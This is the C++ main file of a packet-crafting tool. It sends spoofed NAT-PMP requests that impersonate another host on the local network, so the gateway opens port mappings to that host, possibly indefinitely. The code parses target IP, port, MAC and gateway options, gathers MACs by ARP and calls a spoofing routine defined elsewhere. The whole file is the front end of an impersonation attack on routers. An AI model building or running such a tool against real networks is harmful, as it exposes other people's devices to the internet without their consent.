#pragma once
#include <stdio.h>
#include <cstddef>
#include <iostream>
#include <string>
#include <vector>
#include <bitset>
#include <climits>
#include <iostream>
#include "stdlib.h"
#include "NetFunctions.hpp"
#include "NetFormating.hpp"
#include "GlobalVars.hpp"

#pragma comment(lib, "wpcap" )
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "Common++.lib")
#pragma comment(lib, "Packet++.lib")
#pragma comment(lib, "Pcap++.lib")


std::string get_option(const std::vector<std::string>& args, const std::string& option_name);
uint16_t portcheck(const std::string inputstring, const char* whos);
bool has_option(const std::vector<std::string>& args, const std::string& option_name);

int main(int argc, char* argv[])
{
    if (19 < argc)  // 8*2 + TCP + 1 + 1
    {
        throw std::runtime_error("too many input parameters!");
    }
    if (5 > argc)   // (PH + DA)*2 + 1
    {
        std::cerr << "Not enough arguments!" << std::endl;
        std::cerr << "Usage: " << std::endl
            << "-help  - Shows this message." << std::endl
            << "-PH xxxxx  -  Port on the host, who we are impersonating (REQUIRED)" << std::endl
            << "-DA xxx.xxx.xxx.xxx  - IPv4 of host we will be impersonating (REQUIRED)" << std::endl
            << "-PO xxxxx  - Port on the GateWay (Optional, defaults to specified host port)" << std::endl //If not passed, will be the same as port on the host
            << "-T xxxxxxxxx  - Time of the binding in seconds: 0 for infinite, the max value is 2^32. (Optional, defaults to 7200)" << std::endl
            << "-TCP  - Specifiy to create TCP mapping instead of UDP (Optional)" << std::endl
            << "-GP xxxxx  - Port that NAT-PMP-capable gateway is listening on. (Optional, defaults to 5351)" << std::endl
            << "-GW xxx.xxx.xxx.xxx  - IPv4 of the GateWay (Optional, defaults to IPv4 address of the gateway on the interface)" << std::endl
            << "-DM xx:xx:xx:xx:xx:xx  - Destination (target's) MAC (Optional, but host must be reachable with NetBios)" << std::endl
            << "-GM xx:xx:xx:xx:xx:xx  - Gateway MAC (Optional, but gateway must be reachable with NetBios)" << std::endl;
        return EXIT_FAILURE;
    }

    const std::vector<std::string> launchargs(argv, argv + argc);

    if ((has_option(launchargs, "-help") || has_option(launchargs, "--help")))
    {
        std::cerr << "Usage: " << std::endl
            << "-help  - Shows this message." << std::endl
            << "-PH xxxxx  -  Port on the host, who we are impersonating (REQUIRED)" << std::endl
            << "-DA xxx.xxx.xxx.xxx  - IPv4 of host we will be impersonating (REQUIRED)" << std::endl
            << "-PO xxxxx  - Port on the GateWay (Optional, defaults to specified host port)" << std::endl //If not passed, will be the same as port on the host
            << "-T xxxxxxxxx  - Time of the binding in seconds: 0 for infinite, the max value is 2^32. (Optional, defaults to 7200)" << std::endl
            << "-TCP  - Specifiy to create TCP mapping instead of UDP (Optional)" << std::endl
            << "-GP xxxxx  - Port that NAT-PMP-capable gateway is listening on. (Optional, defaults to 5351)" << std::endl
            << "-GW xxx.xxx.xxx.xxx  - IPv4 of the GateWay (Optional, defaults to IPv4 address of the gateway on the interface)" << std::endl
            << "-DM xx:xx:xx:xx:xx:xx  - Destination (target's) MAC (Optional, but host must be reachable with NetBios)" << std::endl
            << "-GM xx:xx:xx:xx:xx:xx  - Gateway MAC (Optional, but gateway must be reachable with NetBios)" << std::endl;
        return EXIT_FAILURE;
    }

    if (true == has_option(launchargs, "-PH")) //Host port argument handling
    {
        std::string HostPortString = get_option(launchargs, "-PH");
        uint16_t retloc = portcheck(HostPortString, "host");
        if (0 != retloc)
        {
            internalport = retloc;
        }
        else
        {
            return EXIT_FAILURE;
        }
    }
    else
    {
        std::cerr << "Missing port argument. Please specify host's port with \"-PH\"." << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "Host port is " << internalport << ". ";


    if (true == has_option(launchargs, "-PO")) //Gateway binding port argument handling 
    {
        std::string ExternalPortString = get_option(launchargs, "-PO");
        uint16_t retloc = portcheck(ExternalPortString, "gateway");
        if (0 != retloc)
        {
            externalport = retloc;
        }
        else
        {
            return EXIT_FAILURE;
        }
    }
    else
    {
        std::cout << std::endl << "Gateway port wasn't specified. Using the same port...  ";
        externalport = internalport;
    }
    std::cout << "Gateway port for binding is " << externalport << ";" << std::endl;

    istcp = has_option(launchargs, "-TCP"); // TCP/UDP argument handling

    if (true == has_option(launchargs, "-DA")) // Destination IPv4 argument handling
    {
        std::string dastring = get_option(launchargs, "-DA");
        pcpp::IPv4Address testv4( dastring );
        if (true == testv4.isValid())
        {
            DADDR = dastring;
        }
        else
        {
            std::cerr << "Specified IPv4 address of the target isn't valid." << std::endl;
            return EXIT_FAILURE;
        }
    }
    else
    {
        std::cerr << "Missing IPv4 address of the target. Please specify target address with \"-DA\"." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "Target's address is " << DADDR << "; " << std::endl;

    if (true == has_option(launchargs, "-GW")) //Gateway IPv4 argument handling
    {
        std::string gwastring = get_option(launchargs, "-GW");
        pcpp::IPv4Address testv4(gwastring);
        if (true == testv4.isValid())
        {
            DGWAY = gwastring;
        }
        else
        {
            std::cerr << "Specified IPv4 address of the gateway isn't valid." << std::endl;
            return EXIT_FAILURE;
        }
    }

    if (true == has_option(launchargs, "-GM"))
    {
        std::string gmacstring = get_option(launchargs, "-GM");
        GWMAC = gmacstring; //!!THERE'S NEED TO BE EXCEPTION HANDLING BUT THERE IS NONE
    }

    getDevices(); //Interfaces will be added to DEVS vector.
    WinDev OutputInterface = FindAppropriateDevice(DEVS, DADDR); //Will return WinDev object with interface from the same network

    if (false == has_option(launchargs, "DM"))  //If we don't pass destination MAC, we need to get it with ARP
    {
        SMAC = MacVecToStringWithDelimiters(OutputInterface.macaddrvec, ':');
        std::vector <uint8_t> targetmac;
        std::cout << std::endl << "Destination MAC not found, making an ARP request..." << std::endl;
        sendarp(OutputInterface, DADDR, targetmac);
        DMAC = MVTSWD(targetmac, ':');
    }

    if (DGWAY.empty())
    {
        DGWAY = OutputInterface.gwayip;
        if (GWMAC.empty())
        {
            std::vector <uint8_t> gwaymacvec;
            std::cout << std::endl << "Gateway MAC not found, making an ARP request..." << std::endl;
            sendarp(OutputInterface, DGWAY, gwaymacvec);
            std::cout << std::endl;
            GWMAC = VecToString(gwaymacvec);
        }
    }

    uint8_t pretval = sendspoof(DMAC, GWMAC, DADDR, OutputInterface, istcp, internalport, externalport, gwlistenerport, mappinglifetime);
    if (0 == pretval)
        std::cout << "Nat-PMP request sent" << std::endl;

    system("PAUSE");
    return 0;
}



std::string get_option(const std::vector<std::string>& args, const std::string& option_name)
{
    for (auto it = args.begin(), end = args.end(); it != end; ++it)
    {
        if (option_name == *it)
        {
            if ((it + 1) != end)
            {
                return *(it + 1);
            }
        }
    }
    return "";
}



bool has_option(const std::vector<std::string>& args, const std::string& option_name)
{
    for (auto it = args.begin(), end = args.end(); it != end; ++it)
    {
        if (option_name == *it)
        {
            return true;
        }
    }
    return false;
}

uint16_t portcheck(const std::string inputstring, const char* whos)
{
    int64_t portinput;
    try
    {
        portinput = std::stoi(inputstring); //Does it handle exceptions?
    }
    catch (const std::invalid_argument& ia)
    {
        std::cerr << "Invalid argument: " << ia.what() << " when processing port host number." << std::endl;
        return 0;
    }
    if (portinput < 1025)
    {
        std::cerr << "Warning: Ports in range 0-1024 are privileged ports, and such binding request might be denied by the GateWay." << std::endl;
    }
    if (!((portinput > 0) && (portinput < 65536)))
    {
        std::cerr << "Wrong " << whos << " port number!" << std::endl;
        return 0;
    }
    return portinput;
}